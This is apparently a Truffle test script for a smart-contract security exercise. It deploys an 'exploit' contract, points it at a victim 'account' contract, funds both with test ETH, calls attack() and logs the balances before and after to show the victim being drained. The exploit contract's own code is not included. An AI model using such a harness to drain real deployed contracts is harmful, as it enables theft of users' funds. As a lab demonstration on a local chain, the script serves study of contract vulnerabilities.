const ethers  = require("ethers");
const exploit = artifacts.require("exploit");
const account = artifacts.require("account");

contract("exploit", (accounts) => {

    it("should set account address in exploit contract", async () => {
        const accountInstance = await account.deployed();
        const exploitInstance = await exploit.deployed();

        exploitInstance.set_target_contract(accountInstance.address);
    });

    it("should deposit 2 ETH on contract account", async () => {

        const accountInstance = await account.deployed();
        await accountInstance.deposit({value: ethers.utils.parseUnits("2.0"), from: accounts[1]});

    });    

    it("should deposit 1 ETH on contract exploit", async () => {

        const exploitInstance = await exploit.deployed();
        await web3.eth.sendTransaction({to:exploitInstance.address, from:accounts[0],value: ethers.utils.parseUnits("1.0")});

    });        

    it("should attack account", async () => {
        const accountInstance = await account.deployed();

        let balanceInWei = await web3.eth.getBalance(accountInstance.address)
        console.log('balance='+ethers.utils.formatEther(balanceInWei))   

        const exploitInstance = await exploit.deployed();
        await exploitInstance.attack();

        balanceInWei = await web3.eth.getBalance(accountInstance.address)
        console.log('balance='+ethers.utils.formatEther(balanceInWei))         
        
        balanceInWei = await web3.eth.getBalance(exploitInstance.address)
        console.log('balance='+ethers.utils.formatEther(balanceInWei))         
    });    
})